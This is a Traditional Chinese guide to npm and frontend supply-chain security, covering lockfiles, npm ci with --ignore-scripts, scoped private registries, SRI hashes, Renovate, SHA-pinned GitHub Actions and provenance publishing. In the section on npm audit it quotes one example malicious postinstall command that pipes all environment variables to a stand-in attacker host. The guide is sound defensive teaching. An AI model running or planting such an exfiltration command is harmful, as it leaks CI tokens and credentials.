每一次 `npm install` 都是一次信任決策。一個普通的前端專案有數百個直接相依套件，以及數千個間接相依套件——這些套件由你從未謀面的人撰寫、由安全成熟度參差不齊的團隊維護、透過任何人都能發布的公開 registry 散佈。供應鏈安全（supply chain security）的核心是將這整個相依圖（dependency graph）視為攻擊面，並在每個可能出錯的節點施加控制：你安裝了什麼、如何安裝、從哪裡載入、以及你能否驗證收到的就是發布的那個版本。

威脅態勢已大幅演進。2018 年至 2024 年間，惡意 npm 套件的回報數從數十件成長至每年數千件。曾經只是機會性的 typosquatting 嘗試，已演化為精心協調的攻擊：針對維護者的憑證釣魚、只在 CI 環境觸發的 CI-aware payload、以及會利用竊取的 npm token 感染受害者所有套件的自我傳播蠕蟲。2025 年 9 月，攻擊者釣魚取得 `chalk` 套件維護者的帳號，在帳號遭奪取後 16 分鐘內，便發布了 18 個套件的惡意版本——這些套件每週合計下載量超過 26 億次。供應鏈攻擊已不再只是理論，而是大規模的實際威脅。

## 設計思考

### 為什麼 lockfile 是供應鏈防禦的核心

沒有 lockfile 時，`npm install` 會根據 semver range 解析相依套件。`package.json` 中的 `^1.2.3` 會解析到任何 `1.x.y >= 1.2.3` 的版本。如果攻擊者在你從未直接使用、藏在相依樹三層深處的某個間接套件上發布了 `1.2.4` 惡意版本，下一次 `npm install` 會靜默地安裝它。你看不到任何 diff，`package.json` 沒有任何變動，CI 照常通過——因為惡意程式碼並不在已知的 advisory 資料庫中。

Lockfile 透過固定相依樹中每個套件（包含間接相依）的精確版本與 integrity hash 來解決這個問題。`npm ci` 強制執行 lockfile：若 `package.json` 與 lockfile 不一致則直接失敗，且永遠不修改 lockfile。這使得 `npm ci` 成為 CI pipeline 中唯一正確的安裝指令。在 CI 中使用 `npm install` 是一個會靜默漂移的危險選擇。

### 為什麼單靠 `npm audit` 不夠

`npm audit` 查詢的是 npm Advisory Database：一個收錄已回報、已審查、已取得 CVE 編號的漏洞資料庫。這是一個**反應式**（reactive）資料庫——它知道昨天的漏洞，但不知道今天的。今天早上剛發布的惡意套件——其 `postinstall` script 會靜默地將所有環境變數外洩至攻擊者伺服器——`npm audit` 會顯示零個發現。沒有 CVE，從未被回報，它是新的。

Socket.dev 採用行為分析（behavioral analysis）的方式。它分析套件實際的行為：安裝過程中是否發送網路請求？是否執行 shell 指令？是否存取套件目錄以外的檔案？套件名稱是否近似於某個熱門套件的 typosquat？無論是否有人已撰寫 security advisory，這些訊號都是可見的。一個在 `postinstall` script 中執行 `curl https://attacker.com/exfil?data=$(env | base64)` 的套件，在任何 CVE 存在之前就會觸發 Socket 警告。

兩種方式互補，而非相互取代。`npm audit` 高效捕捉已知漏洞；行為分析捕捉零日攻擊與刻意惡意的套件。成熟的供應鏈安全姿態同時使用兩者。

### 為什麼 SRI 對 CDN 載入的 script 至關重要

當你寫下 `<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js">` 時，你正在做出無條件的信任授予。如果該 CDN 遭到入侵，每個包含該標籤的頁面的每個訪客，都會收到攻擊者選擇發送的任何內容——並在你的 origin 中擁有完整的 script 執行權限。CDN 是具吸引力的攻擊目標，正是因為它們同時向數百萬使用者提供內容；單一入侵可造成極大的爆炸半徑。

SRI（Subresource Integrity）透過要求瀏覽器在執行資源之前先驗證，打破了這種無條件信任。`integrity` 屬性攜帶預期檔案內容的密碼學 hash。如果 CDN 傳遞的位元組不能產生該 hash，瀏覽器拒絕執行該 script。透過受損 CDN 提供修改版 JavaScript 的攻擊者，會因 hash 不符而遭瀏覽器自動攔截——無需任何伺服器端變更，也不需要 WAF 規則。

`crossorigin="anonymous"` 屬性在跨來源資源中必須與 `integrity` 一起使用。沒有它，瀏覽器無法存取完整性驗證所需的 CORS 回應標頭，並會退回到不進行驗證的方式載入資源——靜默地失去所有 SRI 保護。這稱為「fail-open」行為，是最常見的 SRI 設定錯誤。

### 為什麼持續更新相依套件優於凍結版本

有些團隊會凍結相依套件版本，以避免更新帶來的 breaking change 風險。這是一種風險認知的倒置。minor 或 patch 版本更新帶來 breaking change 的風險很低、範圍有限且可復原——你的測試會抓到問題，你可以釘回上一個版本。而未修補的重大漏洞的風險是無界的：可能意味著使用者資料外洩、CI 機密竊取或正式環境入侵，且這些都無法在事後復原。

Renovate 和 Dependabot 等自動化更新工具將保持版本更新的摩擦降至近乎為零：它們開 PR、你的 CI 跑測試、PR 自動合併或在測試失敗時阻擋。凍結相依套件、每季跑一次 `npm audit` 的團隊，會積累多年的已知漏洞。每週審查並合併 Renovate PR 的團隊，幾乎不攜帶任何已知漏洞。

## 最佳實踐

**必須（MUST）在 CI 中使用 `npm ci`，而非 `npm install`。** `npm ci` 精確讀取 lockfile、在 lockfile 與 `package.json` 不一致時失敗、永遠不寫入 lockfile，並每次執行全新安裝。它是確定性的（deterministic）。禁止（MUST NOT）在 CI pipeline 中使用 `npm install`——它是非確定性的，每次執行可能靜默解析出不同的相依版本。

**應該（SHOULD）在 CI 中使用 `--ignore-scripts`。** Install script 是惡意套件在安裝時最主要的執行路徑。`npm ci --ignore-scripts` 會阻止所有套件的 `preinstall`、`install`、`postinstall` script 執行。應該（SHOULD）僅為確實需要 install script 的套件（例如 `husky`）加入明確的例外。

**應該（SHOULD）將私有套件的 scope 指向私有 registry。** Dependency confusion 攻擊成立的原因是 npm 預設會在公開 registry 解析未 scope 的套件名稱。若你的內部套件名為 `payment-service`，而攻擊者在公開 registry 發布了版本號更高的 `payment-service`，npm 會解析到攻擊者的版本。應該（SHOULD）為所有內部套件加上 scope（`@myorg/payment-service`），並在 `.npmrc` 中將 `@myorg` 路由到私有 registry，公開 registry 便不會被用於該 scope。

**必須（MUST）為所有 CDN script 和 link 標籤加上 SRI hash。** 禁止（MUST NOT）從文件中複製 CDN 連結而不附加 `integrity` 和 `crossorigin` 屬性。srihash.org 產生器和 `openssl` 指令都能在數秒內產生正確的 hash。

**應該（SHOULD）及時審查自動化相依套件更新的 PR。** 積壓的 Renovate PR 意味著你的相依樹中存在已知漏洞而你選擇不修復。應該（SHOULD）建立每週一次的定期審查節奏。在 CI 驗證通過後，對 patch 和 minor 更新啟用 automerge。

**應該（SHOULD）在相依套件多或頻繁新增套件的 repository 上使用 Socket.dev。** 安裝 GitHub App；它會在 pull request 中，針對新引入或更新的、表現出可疑行為的套件發出評論。應該（SHOULD）搭配 `npm audit` 一起使用，因為它能捕捉尚無 CVE 的惡意套件。

**必須（MUST）將 GitHub Actions 釘定至完整的 commit SHA。** 使用第三方 Actions 的 CI workflow 本身也是一個供應鏈攻擊面。禁止（MUST NOT）釘定至可變 tag（`@v4`）——tag 隨時可以被移動指向不同的 commit。釘定至完整 SHA 是不可變且安全的。

## 範例

### 1. `.npmrc`：將私有套件 scope 指向私有 registry，防止 dependency confusion

```ini
# .npmrc（放置於 repository 根目錄）
# 將 @myorg scope 的套件路由至私有 registry。
# 對於此 scope，公開 npm registry 永遠不會被查詢。
@myorg:registry=https://registry.myorg.com

# 為私有 registry 要求驗證。
//registry.myorg.com/:_authToken=${NPM_TOKEN}
```

若缺少此設定，一旦有人在公開 npm registry 以版本 `99.0.0` 發布 `@myorg/payment-service`，npm 會因版本號較高而優先選擇攻擊者的版本，而非你內部的 `1.2.3`。將 namespace scope 指向私有 registry 可完全消除 confusion 攻擊向量。

### 2. GitHub Actions CI：使用 `npm ci` 和 `npm audit`

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
        with:
          node-version: '20'
          cache: 'npm'

      # --ignore-scripts：阻止 preinstall / postinstall 執行。
      # 這是對抗惡意 install script 的主要防線。
      # 僅為確實需要的套件加入例外。
      - name: Install dependencies
        run: npm ci --ignore-scripts

      # --audit-level=moderate：在發現 moderate、high 或 critical 問題時讓 CI 失敗。
      # 不要附加 || true——那會靜默抑制唯一的自動化漏洞警告。
      - name: Audit dependencies
        run: npm audit --audit-level=moderate

      - name: Build
        run: npm run build
```

注意：兩個 Actions 都釘定至完整的 commit SHA 而非可變 tag。註解記錄了人類可讀的版本號以便維護。

### 3. CDN 載入的 script 加上 SRI `integrity` 屬性

```html
<!-- 沒有 SRI：對 CDN 的無條件信任 -->
<!-- 錯誤——不要在正式環境使用此模式 -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>

<!-- 有 SRI：瀏覽器在執行前驗證 hash -->
<!-- 正確 -->
<script
  src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"
  integrity="sha384-1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5xXxAvs/HgeFs"
  crossorigin="anonymous"
></script>

<!-- 樣式表的 SRI -->
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
  integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
  crossorigin="anonymous"
/>
```

`crossorigin="anonymous"` 屬性是必須的。若缺少它，瀏覽器會在沒有 integrity 驗證的情況下載入資源——靜默地失去所有 SRI 保護。

### 4. 使用 openssl 產生 SRI hash

```bash
# 先下載檔案，再產生 sha384 hash。
curl -sL https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js \
  -o jquery.min.js

# 產生 hash。
openssl dgst -sha384 -binary jquery.min.js | openssl base64 -A

# 輸出即為 integrity 屬性的值，需加上 "sha384-" 前綴。
# 範例輸出：
#   1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5xXxAvs/HgeFs
# 完整屬性值：
#   integrity="sha384-1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5xXxAvs/HgeFs"

# 也可使用 srihash.org 網頁工具進行一次性產生。
```

### 5. Renovate 設定：自動化相依套件更新

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:recommended"
  ],
  "schedule": ["before 6am on Monday"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch"],
      "automerge": true,
      "automergeType": "pr",
      "platformAutomerge": true
    },
    {
      "groupName": "dev tooling",
      "matchDepTypes": ["devDependencies"],
      "matchPackagePatterns": ["eslint", "prettier", "typescript", "vite"],
      "matchUpdateTypes": ["minor", "patch"],
      "automerge": true
    },
    {
      "matchUpdateTypes": ["major"],
      "automerge": false,
      "labels": ["dependency-major"]
    }
  ],
  "vulnerabilityAlerts": {
    "labels": ["security"],
    "automerge": true
  }
}
```

此設定的行為：CI 通過後自動合併 patch 更新；將常見的 dev tooling 更新分組，避免 PR 佇列被噪音填滿；major 版本升級需要人工審查；安全漏洞修復無論更新類型為何都自動合併。

### 6. 發布時加入 provenance（SLSA Level 2+）

```yaml
# .github/workflows/publish.yml
name: Publish

on:
  push:
    tags: ['v*']

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write   # provenance 驗證所需
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
        with:
          node-version: '20'
          registry-url: 'https://registry.npmjs.org'

      - run: npm ci --ignore-scripts
      - run: npm run build

      # --provenance 將發布的套件連結至此特定 repository 和 workflow run。
      # 可透過 npm audit signatures 驗證。
      - run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

使用者安裝後可透過 `npm audit signatures` 驗證 provenance。

## 常見錯誤

**不提交 lockfile。** 「lockfile 會造成 merge conflict」這個論點是真的——lockfile 的合併衝突確實存在。解決方法是接受其中一方並重新執行安裝，整個過程不到一分鐘。替代方案——在沒有 lockfile 的情況下運作——意味著每次 CI 執行都可能靜默地解析出不同的相依樹。偶爾解決一次 lockfile merge conflict 的摩擦，相比靜默安裝新的惡意間接相依套件的風險，幾乎可以忽略不計。

**使用 `|| true` 抑制 `npm audit` 失敗。** 這個模式出現在 CI 設定中，通常是因為團隊隨時間積累了大量 audit 失敗，最終選擇關閉 gate 而非修復問題。結果是一個執行 `npm audit`、發現已知漏洞、然後無論如何繼續建置並回報成功的 CI。Audit 輸出被產生後立即被丟棄。如果 audit gate 一直失敗，正確的回應是修復漏洞，或對已接受的風險明確添加例外——而不是關閉 gate。

**假設 `devDependencies` 是安全的。** `devDependencies` 不會安裝在正式環境，但它們會安裝在你的開發環境和 CI pipeline 中。你的 CI 環境存有 `NODE_AUTH_TOKEN`、AWS 憑證、GitHub token 和部署金鑰。`devDependencies` 中帶有 `postinstall` script 的惡意套件可以外洩所有這些機密。2025 年 9 月的 Shai-Hulud 蠕蟲專門鎖定 CI 環境竊取 npm token，並利用它們進行傳播。`devDependencies` 並非低風險的類別。
